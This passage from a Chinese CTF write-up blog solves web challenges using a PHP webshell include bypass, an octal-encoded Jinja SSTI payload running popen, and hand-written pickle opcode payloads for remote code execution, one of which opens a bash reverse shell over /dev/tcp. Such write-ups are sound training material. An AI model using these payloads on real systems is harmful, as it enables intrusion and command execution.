alt="image-20231019011616135"></p><p>文件后缀改为php，并发送</p><p><img src="/posts/43716/image-20231019011730708.png" alt="image-20231019011730708"></p><p>漏洞复现成功啦，但是你会发现怎么跟上面文章不一样</p><p>嗯？为什么？究竟为什么？啊啊啊啊，玉玉了</p><p>百思不得其解，但经过后来一通乱点发现了<del>机密</del></p><p>是因为做了过滤</p><p>点击<strong>Media manager</strong></p><p><img src="/posts/43716/image-20231019011953233.png" alt="image-20231019011953233"></p><p>会有一个<strong>FilesystemAdapter.php</strong></p><p>下载来看看<img src="/posts/43716/image-20231019012323953.png" alt="image-20231019012323953"></p><p>发现对后缀以及内容进行了过滤，真是太<strong>罪恶</strong>了😡</p><blockquote><p><em><strong>怎么办，难道就要停滞不前了吗</strong></em></p><p><em><strong>嘿，不要小看羁绊的力量啊！！</strong></em></p></blockquote><p>好吧，其实是等了几天，出题人了加了hint</p><blockquote><p>php关键词列表:<br><a href="https://www.php.net/manual/zh/reserved.keywords.php">https://www.php.net/manual/zh/reserved.keywords.php</a><br>参考这个:<br><a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p></blockquote><p>一看，师傅好手艺，妙手回春啊，受教了</p><p>waf没有过滤<code>include</code>和引号</p><p>那就上传个一句话木马txt（蚁剑连不上，不造为什么</p><p>再用include包含它，执行就好了，方法跟上面一样</p><p>一通操作直接得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0U_H4cked_My_LaRaV31_4dM1n&#125;</code></font></center></strong></em></p><h2 id="Mid-💻-CNSS娘の聊天室"><a href="#Mid-💻-CNSS娘の聊天室" class="headerlink" title="[Mid] 💻 CNSS娘の聊天室"></a>[Mid] 💻 CNSS娘の聊天室</h2><p>这题卡死我了，搜索引擎快被橄榄了呢</p><p>一眼ssti，但是屏蔽了英文字母</p><p>好好好，不会，开搜，经过漫长的搜索，发现可以八进制绕过（🤮</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//payload</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;__class__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__bases__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__subclasses__&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__init__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__globals__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;popen&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;read&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br><br><span class="hljs-comment">//转换为8进制</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">163</span>\<span class="hljs-number">165</span>\<span class="hljs-number">142</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">151</span>\<span class="hljs-number">164</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">147</span>\<span class="hljs-number">154</span>\<span class="hljs-number">157</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">160</span>\<span class="hljs-number">157</span>\<span class="hljs-number">160</span>\<span class="hljs-number">145</span>\<span class="hljs-number">156</span>&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;\154\163&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">162</span>\<span class="hljs-number">145</span>\<span class="hljs-number">141</span>\<span class="hljs-number">144</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019155400087.png" alt="image-20231019155400087"></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_ru1n3d_my_ch4tr00m!&#125;</code></font></center></strong></em></p><h2 id="Mid-🛒-CNSS娘のFlag商店"><a href="#Mid-🛒-CNSS娘のFlag商店" class="headerlink" title="[Mid] 🛒 CNSS娘のFlag商店"></a>[Mid] 🛒 CNSS娘のFlag商店</h2><p>（其实我觉得这个才应该是Mid+</p><p><strong>&#x2F;code</strong>下载源码</p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br>flag = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(user.name, user.money)<br>    <span class="hljs-built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;CNSS娘最喜欢富哥啦，这是你要的flag <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>根据源码可知要对**&#x2F;?user**进行请求</p><p>对<code>R</code>命令进行了过滤，但是我们还有i和从c指令</p><p><strong>R:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcocde">b&#x27;&#x27;&#x27;cos<br>system<br>(S&#x27;whoami&#x27;<br>tR.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>i:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;<br>ios<br>system<br>.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>o:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(cos<br>system<br>S&#x27;whoami&#x27;<br>o.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p>这里涉及到一个叫<strong>opcode</strong>的东西</p><blockquote><p><em>找到的资料：</em></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">Python pickle 反序列化实例分析 - 安全客，安全资讯平台 (anquanke.com)</a></p></blockquote><p>一些点：</p><ul><li><p>c指令会自动import库，所以在源代码中不需要引入相关库</p></li><li><p>opcode可以手写，也可以用**<code>pickle.dumps(,protocol=0)</code>**生成，但是使用的pickle版本不能过高，因为高版本有很多不可见字符，不方便编辑（生成的不知道为啥我用了，所以我干脆手写了</p></li><li><blockquote><p>可以使用<strong>pickletools</strong>来调试</p><p><strong>pickletools</strong>是python自带的pickle调试器，有三个功能：</p><ol><li><strong>反汇编</strong>一个已经被打包的字符串</li><li><strong>优化</strong>一个已经被打包的字符串</li><li><strong>返回</strong>一个迭代器来供程序使用</li></ol><p>我们一般使用前两种。详看资料1</p></blockquote></li></ul><p><strong>脚本：</strong></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">buyInfo</span><br><span class="hljs-string">(c__main__</span><br><span class="hljs-string">Hi</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">NAME</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">MONEY</span><br><span class="hljs-string">o-.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><span class="hljs-built_in">print</span>(pickle.loads(data).NAME, pickle.loads(data).MONEY)<br><br>url = <span class="hljs-string">f&quot;https://cnss-flag-shop-d22515ddfd9086fbb6b0c41c686a25c3.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&quot;&quot;&quot;c__main__<br>buyInfo<br>(c__main__<br>Hi<br>cbuyInfo<br>NAME<br>cbuyInfo<br>MONEY<br>o0.<br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019171808844.png" alt="image-20231019171808844"></p><p>解释一下这一坨</p><ol><li>手写<code>c</code>指令获得全局变量<code>__main__.buyInfo</code></li><li><code>(</code>标记mark压入栈</li><li>再用<code>c</code>指令引入<code>__main__.Hi</code></li><li><code>c</code>引入<code>buyInfo.NAME</code>和<code>buyInfo.MONEY</code></li><li><code>o</code>寻找栈中的上一个MARK（3），以之间的第一个数据<code>__main__.Hi</code>为callable，第2个到第3个数据为参数，执行该函数（或实例化一个对象）</li><li><code>0</code>丢弃栈（可以不写，但是会报警告：<code>stack not empty after STOP</code>，<del>也可以放在1和2之间，不知道为什么</del></li><li><code>.</code>结束</li></ol><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>–来自<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_r1ch_k1d5&#125;</code></font></center></strong></em></p><h2 id="Mid-🔪-CNSS娘の自助Flag商店"><a href="#Mid-🔪-CNSS娘の自助Flag商店" class="headerlink" title="[Mid+] 🔪 CNSS娘の自助Flag商店"></a>[Mid+] 🔪 CNSS娘の自助Flag商店</h2><p>也是pickle</p><p>同样**&#x2F;code**下载源码</p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> buyInfo<br><br>app = flask.Flask(__name__)<br><span class="hljs-comment"># flag is in /flag.txt</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME, buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;你说得对，但是上次CNSS娘被你骗了之后很伤心，把商店改成了自助flag商店，你得自己找flag&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>同样，用<code>/user?</code>请求且过滤了<code>R</code>命令</p><p>但这题不需要<code>user == Hi(buyInfo.NAME, buyInfo.MONEY):</code></p><p>因为<code>picke.loads()</code>在比较之前就执行了opcode</p><p>那就直接上一题，除了<code>R</code>之外的2个RCE选1个就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&quot;bash -i &gt;`&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1&quot;</span><br><span class="hljs-string">o.&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(urllib.parse.quote(data))<br>url = <span class="hljs-string">f&quot;https://cnss-self-help-flag-shop-62058b9d09f9929106bff019ac365627.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;urllib.parse.quote(data)&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-comment"># pickle.loads(data)</span><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><br></code></pre></td></tr></table></figure><p>是不是很简单😡，但是py的编码问题搞了我很久，讨厌py</p><p>反弹shell秒了，<strong>但是千万记得开端口</strong>（为了写一题花￥95，哭了</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_c1ev3r_k1ds&#125;</code></font></center></strong></em></p><h2 id="Mid-🏭-EzPollution-pre"><a href="#Mid-🏭-EzPollution-pre" class="headerlink" title="[Mid+] 🏭 EzPollution_pre"></a>[Mid+] 🏭 